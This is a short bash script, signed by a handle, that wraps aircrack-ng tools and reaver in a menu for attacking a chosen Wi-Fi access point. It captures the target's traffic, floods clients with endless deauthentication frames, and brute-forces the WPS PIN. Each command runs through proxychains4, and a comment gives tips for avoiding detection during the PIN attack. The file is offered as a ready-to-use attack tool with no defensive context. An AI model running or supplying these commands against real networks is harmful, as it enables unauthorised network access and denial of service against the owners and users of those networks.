#!/bin/bash
echo "Enter the bssid: "
read bssid
echo "Enter the channel name: "
read channel_name
if [ $bssid ] && [ $channel_name ]
then
	select attacks in monitor launch2capture launch2deauth rambo_reaver
	do
		case $attacks in
			monitor )
				for command in proxychains4
				do
					$command airodump-ng -c $channel_name --bssid $bssid wlan1

				done ;;

			launch2capture )
				for command in proxychains4
				do
					$command airodump-ng -w wifikills -c $channel_name --bssid $bssid wlan1

				done ;;

			launch2deauth )
				for command in proxychains4
				do
					$command aireplay-ng --deauth=0 -a $bssid wlan1

				done ;;

#reaver is vulnerable to detection as too many tries can cause an abrupt disconnetion to your exploit.
#solution is to lookup the router's MAC address and see what its AP rating is.
			rambo_reaver )
				for command in proxychains4
				do
					$command reaver -b $bssid -i wlan1 -c $channel_name -r 2:60 -vv

				done ;;

			* )
				echo "N0thing S3l3ct3d!!";;
		esac
	done

else
	echo "3rr0r pr0c3ss!!"

fi

#~Scripted by P4p4m1dn1ght#
